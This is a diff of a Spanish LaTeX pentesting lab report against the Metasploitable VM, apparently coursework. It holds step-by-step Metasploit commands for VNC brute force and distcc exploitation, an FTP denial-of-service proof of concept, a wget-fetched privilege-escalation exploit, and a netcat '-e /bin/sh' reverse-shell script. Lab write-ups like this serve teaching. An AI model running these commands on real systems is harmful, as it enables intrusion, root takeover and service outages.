@@ -49,7 +49,7 @@
   basicstyle=\ttfamily,
   keywordstyle=\color{blue}\ttfamily,
   stringstyle=\color{red}\ttfamily,
-  commentstyle=\color{green}\ttfamily,
+  commentstyle=\color{brown}\ttfamily,
   morecomment=[l][\color{magenta}]{\#}
 }
 
@@ -363,7 +363,7 @@ Para hacer uso del programa, abrimos un navegador web y accedemos a la URL que s
 \label{fig:graf1}
 \end{figure}
 
-Será necesario registrarnos para poder hacer uso del programa. Figura \ref{fig:graf2}.
+Será necesario registrarnos para poder hacer uso del programa (figura \ref{fig:graf2}). \\
 
 \begin{figure}[htbp]
 \centering
@@ -372,7 +372,7 @@ Será necesario registrarnos para poder hacer uso del programa. Figura \ref{fig:
 \label{fig:graf2}
 \end{figure}
 
-Dispondremos de un gran número de opciones para obtener información de la víctima y atacarla (Figura \ref{fig:graf3}). El uso de la interfaz es muy cómodo e intuitivo, se pueden realizar todas las operaciones con ''clicks'' de ratón, como la selección de la víctima, el ataque a relizar, etc... Para un uso avanzado, uso de scripts y ciertas opciones, es necesario ser un usuario \emph{plus}, hay que pagar.
+Dispondremos de un gran número de opciones para obtener información de la víctima y atacarla (figura \ref{fig:graf3}). El uso de la interfaz es muy cómodo e intuitivo, se pueden realizar todas las operaciones con ''clicks'' de ratón, como la selección de la víctima, el ataque a relizar, etc... Para un uso avanzado, uso de scripts y ciertas opciones, es necesario ser un usuario \emph{plus}, hay que pagar.
 
 \begin{figure}[htbp]
 \centering
@@ -383,10 +383,10 @@ Dispondremos de un gran número de opciones para obtener información de la víc
 
 % #######################   VNC POR FUERZA BRUTA   ##################################
 
-\subsection{VNC por fuerza bruta}
-A continuación, se muestra un ataque al servicio VNC por \emph{fuerza bruta}. La fuerza bruta, consiste autenticarse usando diferentes contraseñas hasta que se encuentra la correcta, estas contraseñas pueden generarse de forma aleatoria o se puede hacer uso de un \emph{diccionario}. 
+\subsection{Fuerza bruta}
+A continuación, se muestra un ataque al servicio VNC por \emph{fuerza bruta}. La fuerza bruta, consiste autenticarse usando diferentes contraseñas hasta que se encuentra la correcta, estas contraseñas pueden generarse de forma aleatoria o se puede hacer uso de un \emph{diccionario}. \\
 
-Un diccionario es un fichero de texto con una lista de contraseñas, estas contraseñas pueden ser de la lista de contraseñas más habituales o puede ser una lista especializada, contraseñas que los fabricantes ponen a sus dispositivos por defecto, bien basada en un algoritmo que ya ha sido descubierto o que todos los dispositivos tengan la misma. \\
+Un diccionario es un fichero de texto con una lista de contraseñas, estas contraseñas pueden ser de la lista de contraseñas más habituales o puede ser una lista especializada, contraseñas que los fabricantes ponen a sus dispositivos por defecto, bien basada en un algoritmo que ya ha sido descubierto o que todos los dispositivos tengan la misma.
 
 \begin{enumerate}
 	\item Realizamos un escaneo de puertos para verificar que el de VNC está abierto. Con NMAP se ve claramente, indica el nombre de servicio.
@@ -420,7 +420,7 @@ Un diccionario es un fichero de texto con una lista de contraseñas, estas contr
 			msf auxiliary(vnc\_login) > set THREADS 20
 			msf auxiliary(vnc\_login) > set BRUTEFORCE_SPEED 1
 		\end{verbatim}
-		
+
 \begin{figure}[htbp]
 \centering
 \includegraphics[width=1.0\textwidth]{./images/vnc/parametros_ataque_vnc.png}
@@ -432,19 +432,19 @@ Un diccionario es un fichero de texto con una lista de contraseñas, estas contr
 		\begin{verbatim}
 			msf auxiliary(vnc\_login) > run
 		\end{verbatim}
-		
+
 	\item Como resultado, se muestra el resultado del ataque y las credenciales en caso de éxito. Como se puede ver en la figura \ref{fig:vnc1}, la contraseña de acceso es \emph{password}.
-	
+
 	\item Para la conexión al equipo remoto necesitamos un cliente de VNC, podemos instalar \emph{vinagre}, que se encuentra en el repositorio de Ubuntu. Lo iniciamos en el mismo comando.
 		\begin{verbatim}
 			$ sudo apt-get install vinagre && vinagre
 		\end{verbatim}
-	
+
 	\item En la ventana que aparece, introducimos el equipo al que nos queremos conectar, en nuestro caso \emph{metasploitable} y pulsamos \emph{Conectar}. Figura \ref{fig:vnc2}.
 
 \begin{figure}[htbp]
 \centering
-\includegraphics[width=0.8\textwidth]{./images/vnc/equipo_acceso.png}
+\includegraphics[width=0.7\textwidth]{./images/vnc/equipo_acceso.png}
 \caption{Vinagre.}
 \label{fig:vnc2}
 \end{figure}
@@ -453,20 +453,154 @@ Un diccionario es un fichero de texto con una lista de contraseñas, estas contr
 
 \begin{figure}[htbp]
 \centering
-\includegraphics[width=0.8\textwidth]{./images/vnc/credenciales_acceso.png}
+\includegraphics[width=0.7\textwidth]{./images/vnc/credenciales_acceso.png}
 \caption{VNC credenciales acceso.}
 \label{fig:vnc3}
 \end{figure}
 
 	\item Llegados a este punto ya tendremos establecida una conexión con la víctima vía VNC (Figura \ref{fig:vnc4}). Este puede ser un buen ataque para obtener ficheros de la víctima o monitorizar sus actividades. \\
-	 Aunque en este caso accedemos como usuario root, lo más habitual es que el acceso vía VNC solo esté habilitado para usuarios con un bajo nivel de permisos.
-	
+
+  Aunque en este caso accedemos como usuario root, lo más habitual es que el acceso vía VNC solo esté habilitado para usuarios con un bajo nivel de permisos.
+
 \begin{figure}[htbp]
 \centering
 \includegraphics[width=1\textwidth]{./images/vnc/vnc_conectado.png}
 \caption{Conexión VNC.}
 \label{fig:vnc4}
 \end{figure}
+
+\end{enumerate}
+
+% #######################   Denegación de servicio ##################################
+
+\clearpage
+\subsection{Denegación de servicio}
+
+Una denegación de servicio (DoS) es un ataque a un sistema o red que causa que un servicio o recurso sea inaccesible a los usuarios legítimos. \\
+
+Los ataques DoS se generan mediante la saturación de los puertos con múltiples flujos de información, haciendo que el servidor se sobrecargue y no pueda seguir prestando su servicio. \\
+
+En este caso, vamos a hacer una denegación de servicio al servidor ftp de la víctima.
+
+\begin{enumerate}
+	\item Realizamos un escaneo de puertos para verificar que el puerto ftp de la víctima está abierto.
+
+\begin{verbatim}
+$ sudo nmap metasploitable
+\end{verbatim}
+
+	\item Necesitamos obtener un usuario y contraseña para poder acceder al servidor ftp. Para este paso, podemos hacer uso de la fuerza bruta del apartado anterior o bien conectarnos por telnet a la víctima y observar que ahí tenemos acceso a un usuario y contraseña. Obtenemos el siguiente usuario y contraseña.
+
+\begin{verbatim}
+USER: user
+PASS: user
+\end{verbatim}
+
+	\item Compilamos y ejecutamos el código que va a producir la denegación de servicio, pasándole como parámetros la IP de la víctima, el usuario y la contraseña válidos que hemos obtenido. Este código genera múltiples conexiones ftp a la víctima, además de generar cada vez un buffer de 4096 bytes con basura, pero que el servidor ftp de la víctima tendrá que analizar. Todo ello ocasiona que el servidor ftp de la víctima se colapse y provoque la no conexión de otros usuarios.
+
+\begin{verbatim}
+$ gcc -o vspoc232 vspoc232.c
+$ ./vspoc232 192.168.62.189 user user 1
+\end{verbatim}
+
+    En la figura \ref{fig:metade1} podemos observar cómo han sido necesarias 287 peticiones para ocasionar la denegación de servicio.
+
+    %%% Importar fichero
+    \lstinputlisting[breaklines]{doc/MetaDe.c}
+
+    \begin{figure}[htbp]
+    \centering
+    \subfigure[Ataque a  la víctima]
+    {\includegraphics[width=0.7\textwidth]{./images/MetaDe3.png}}
+    \subfigure[Posterior intento de acceso]
+    {\includegraphics[width=0.7\textwidth]{./images/MetaDe2.png}}
+    \caption{Denegación de servicio ftp a la víctima desde el atacante.}
+    \label{fig:metade1}
+    \end{figure}
+
+\end{enumerate}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Elevación de privilegios
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\clearpage
+\subsection{Elevación de privilegios}
+
+La elevación de privilegios es la técnica consistente en conseguir permisos por encima de los que han sido asignados en primera instancia. \\
+
+En este caso, vamos a realizar una elevación de privilegios a través de una vulnerabilidad del servicio Distcc.
+
+\begin{enumerate}
+	\item Accedemos a la consola de Metasploit.
+\begin{verbatim}
+$ sudo msfconsole
+\end{verbatim}
+
+	\item Accedemos al módulo relativo a distcc.
+\begin{verbatim}
+msf > search distcc
+msf > use exploit/unix/misc/distcc_exec
+\end{verbatim}
+
+	\item Fijamos los parámetros del ataque y ejecutamos.
+\begin{verbatim}
+msf auxiliary(distcc_exec) > set RHOSTS metasploitable
+msf auxiliary(distcc_exec) > exploit
+\end{verbatim}
+
+  \item Tal y como nos aparece en la figura \ref{fig:metaele1} hemos conseguido acceder a la víctima como demonio del servicio distcc.
+
+  \begin{figure}[htbp]
+  \centering
+  \includegraphics[width=0.9\textwidth]{./images/MetaEle1.png}
+  \caption{Elevación de privilegios: ejecución de distcc.}
+  \label{fig:metaele1}
+  \end{figure}
+
+  \item Una vez como daemon descargamos y compilamos el exploit con el que vamos a proceder a hacer la elevación de privilegios. El código del exploit ejecuta el shell que se encuentra en /tmp/run y crea un socket al que se le indica el pid del proceso vulnerable.
+
+\begin{verbatim}
+wget http://www.exploit-db.com/download/8572
+mv 8572. exploit.c
+gcc -o exploit exploit.c
+\end{verbatim}
+
+  %%% Importar fichero
+  \lstinputlisting[breaklines]{doc/MetaEle.c}
+
+  \item Antes de ejecutar el exploit.c, debemos abrir un puerto al cual se  conectará la victima al lanzar el exploit. Para ello, utilizaremos el comando netcat.
+
+\begin{verbatim}
+$ sudo netcat -vlp 6666
+\end{verbatim}
+
+  \item Creamos un script que permite generar una conexión desde la máquina víctima al puerto que está escuchando en la maquina atacante.
+
+\begin{verbatim}
+echo "#!/bin/bash" >> /tmp/run
+echo "/bin/netcat -e /bin/sh 192.168.61.189 6666" >> /tmp
+/run
+\end{verbatim}
+
+  \item A continuación identificamos el proceso “udevd”, pues usaremos su id-1 para ejecutar el exploit, como muestra la figura \label{fig:metaele2}.
+
+  \begin{figure}[htbp]
+  \centering
+  \includegraphics[width=0.8\textwidth]{./images/MetaEle2.png}
+  \caption{Elevación de privilegios: /tmp/run.}
+  \label{fig:metaele2}
+  \end{figure}
+
+  \item Finalmente se realiza la conexión de la víctima al atacante y obtenemos la sesión de root, como se observa en la figura \label{fig:metaele3}.
+
+  \begin{figure}[htbp]
+  \centering
+  \includegraphics[width=0.8\textwidth]{./images/MetaEle3.png}
+  \caption{Elevación de privilegios: obtención de root.}
+  \label{fig:metaele3}
+  \end{figure}
+
 
 \end{enumerate}
 
